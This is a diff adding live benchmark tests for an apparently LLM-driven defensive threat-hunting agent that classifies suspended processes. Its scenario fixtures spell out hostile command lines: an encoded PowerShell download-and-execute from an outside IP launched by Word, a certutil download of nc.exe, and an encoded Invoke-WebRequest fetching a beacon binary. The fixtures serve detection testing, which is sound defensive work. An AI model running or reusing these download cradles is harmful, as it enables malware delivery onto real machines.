@@ -470,4 +470,187 @@ public class AutonomousHunterAgentTests
         Assert.Equal(0.95, decision.ConfidenceScore);
         Assert.Contains("{ nested: true", decision.Thought);
     }
+
+    [Fact]
+    [Trait("Category", "Live")]
+    public async Task TestLive_MultiScenario_AverageTurnAndLatencyBenchmark()
+    {
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool()
+        };
+
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        // 4대 실무 시나리오 구성
+        var scenarios = new (string Name, string ParentImage, uint ParentPid, string TargetImage, uint TargetPid, string CommandLine)[]
+        {
+            (
+                "1. 파일리스 C2 인라인 다운로더 (Office Macro)",
+                "winword.exe", 2001,
+                "powershell.exe", 2002,
+                $"powershell.exe -NoProfile -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')"))}"
+            ),
+            (
+                "2. LOLBAS CertUtil 악성 원격 다운로드 (Excel)",
+                "excel.exe", 2101,
+                "certutil.exe", 2102,
+                "certutil.exe -urlcache -split -f http://185.220.101.5/nc.exe C:\\Temp\\nc.exe"
+            ),
+            (
+                "3. 인메모리 반사형 코드 주입 (Outlook ➔ CMD)",
+                "outlook.exe", 2201,
+                "cmd.exe", 2202,
+                "cmd.exe /c powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AYgBlAGEAYwBvAG4ALgBiAGkAbgAnACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVABlAG0AcABcAGIAZQBhAGMAbwBuAC4AYgBpAG4A"
+            ),
+            (
+                "4. 정상 관리자 인트라넷 점검 스크립트 (Explorer ➔ PowerShell)",
+                "explorer.exe", 2301,
+                "powershell.exe", 2302,
+                $"powershell.exe -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File -FilePath '\\\\internal-backup.corp.local\\status.log'"))}"
+            )
+        };
+
+        var results = new List<(string Name, string Verdict, double Confidence, int Turns, double ElapsedMs)>();
+
+        _output.WriteLine("=========================================================================================");
+        _output.WriteLine("   PHALANX GEMINI 3.8 FLASH 멀티 시나리오 평균 턴 수 & 지연시간 실측 벤치마크 (Live)   ");
+        _output.WriteLine("=========================================================================================");
+
+        foreach (var sc in scenarios)
+        {
+            treeManager.ApplySnapshotBatch(new[]
+            {
+                new ProcessEvent
+                {
+                    ProcessId = sc.ParentPid,
+                    ImageName = sc.ParentImage,
+                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
+                }
+            });
+
+            treeManager.ApplyDeltaEvent(new ProcessEvent
+            {
+                ProcessId = sc.TargetPid,
+                ParentProcessId = sc.ParentPid,
+                ImageName = sc.TargetImage,
+                CommandLine = sc.CommandLine,
+                IsSuspended = true,
+                Lifecycle = ProcessLifecycle.LifecycleSuspended
+            });
+
+            var targetNode = treeManager.FindActiveNodeByPid(sc.TargetPid);
+            Assert.NotNull(targetNode);
+
+            _output.WriteLine($"\n▶ [실측 시작] {sc.Name}");
+            _output.WriteLine($"  - 부모 프로세스: {sc.ParentImage} (PID: {sc.ParentPid})");
+            _output.WriteLine($"  - 타깃 프로세스: {sc.TargetImage} (PID: {sc.TargetPid})");
+            _output.WriteLine($"  - 명령줄 인자  : {sc.CommandLine[..Math.Min(sc.CommandLine.Length, 80)]}...");
+
+            var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
+
+            int turns = res.Traces.Count(t => t.ActionTool != "SystemFirewallTool");
+            results.Add((sc.Name, res.VerdictAction.ToString(), res.Confidence, turns, res.Elapsed.TotalMilliseconds));
+
+            _output.WriteLine($"  ✔ 판결: {res.VerdictAction} (확신도: {res.Confidence:P0}) | 소요 턴: {turns}턴 | 시간: {res.Elapsed.TotalMilliseconds:F0}ms");
+            _output.WriteLine($"  ✔ 사건 서사 요약: {res.SummaryTitle}");
+
+            // 구글 클라우드 RPM 버퍼링 (1초)
+            await Task.Delay(1000);
+        }
+
+        // 통계 집계
+        double avgTurns = results.Average(r => r.Turns);
+        double avgElapsed = results.Average(r => r.ElapsedMs);
+
+        _output.WriteLine("\n=========================================================================================");
+        _output.WriteLine("                               📊 벤치마크 종합 실측 결과                                ");
+        _output.WriteLine("=========================================================================================");
+        foreach (var r in results)
+        {
+            _output.WriteLine($" • [{r.Verdict,-13}] {r.Turns}턴 | {r.ElapsedMs,7:F0} ms | {r.Confidence,4:P0} | {r.Name}");
+        }
+        _output.WriteLine("-----------------------------------------------------------------------------------------");
+        _output.WriteLine($" ⭐ 평균 소요 턴 수 : {avgTurns:F2} 턴 (최대 5턴 예산 대비 최적화율: {(1 - avgTurns / 5.0) * 100:F1}%)");
+        _output.WriteLine($" ⭐ 평균 완결 시간   : {avgElapsed:F0} ms ({avgElapsed / 1000.0:F2} 초 / 50초 SLA 대비 충분한 마진)");
+        _output.WriteLine("=========================================================================================\n");
+
+        Assert.True(avgTurns <= 5.0, $"평균 턴 수가 최대 한도(5턴)를 초과함: {avgTurns}");
+        Assert.True(avgElapsed < 50000, $"평균 수사 시간이 50초 SLA를 초과함: {avgElapsed}ms");
+    }
+
+    [Fact]
+    [Trait("Category", "Live")]
+    public async Task TestLive_InspectScenario4_AdminScriptTraces()
+    {
+        var treeManager = new ProcessTreeProjectionManager();
+        var archiveManager = ForensicArchiveManager.CreateInMemory();
+        var tools = new IInvestigationTool[]
+        {
+            new DecodePayloadTool(),
+            new ProcessMemoryScanTool(),
+            new ThreatReputationTool(),
+            new MitreClassifierTool(),
+            new SystemFirewallTool()
+        };
+
+        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
+
+        treeManager.ApplySnapshotBatch(new[]
+        {
+            new ProcessEvent
+            {
+                ProcessId = 2301,
+                ImageName = "explorer.exe",
+                Lifecycle = ProcessLifecycle.LifecycleSnapshot
+            }
+        });
+
+        string script = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File -FilePath '\\\\internal-backup.corp.local\\status.log'";
+        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
+        string cmdLine = $"powershell.exe -enc {b64}";
+
+        treeManager.ApplyDeltaEvent(new ProcessEvent
+        {
+            ProcessId = 2302,
+            ParentProcessId = 2301,
+            ImageName = "powershell.exe",
+            CommandLine = cmdLine,
+            IsSuspended = true,
+            Lifecycle = ProcessLifecycle.LifecycleSuspended
+        });
+
+        var targetNode = treeManager.FindActiveNodeByPid(2302);
+        Assert.NotNull(targetNode);
+
+        var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
+
+        _output.WriteLine("=========================================================================");
+        _output.WriteLine("   시나리오 4 (정상 관리자 인트라넷 점검 스크립트) 세부 수사 로그 실사   ");
+        _output.WriteLine("=========================================================================");
+        _output.WriteLine($"최종 판결       : {res.VerdictAction}");
+        _output.WriteLine($"확신도         : {res.Confidence:P1}");
+        _output.WriteLine($"제목           : {res.SummaryTitle}");
+        _output.WriteLine($"전체 서사       :\n{res.Narrative}");
+        _output.WriteLine($"차단된 IP      : {res.BlockedIp}");
+        _output.WriteLine($"MITRE 전술     : {string.Join(", ", res.MitreTactics)}");
+        _output.WriteLine("-------------------------------------------------------------------------");
+        _output.WriteLine("단계별 ReAct 트레이스 (Thought / Action / Observation):");
+        foreach (var trace in res.Traces)
+        {
+            _output.WriteLine($"\n[Step {trace.StepNumber}] 도구: {trace.ActionTool}");
+            _output.WriteLine($"  ▶ Thought    : {trace.Thought}");
+            _output.WriteLine($"  ▶ Args       : {trace.ActionArgsJson}");
+            _output.WriteLine($"  ▶ Observation: {trace.Observation}");
+        }
+        _output.WriteLine("=========================================================================\n");
+    }
 }
+
+
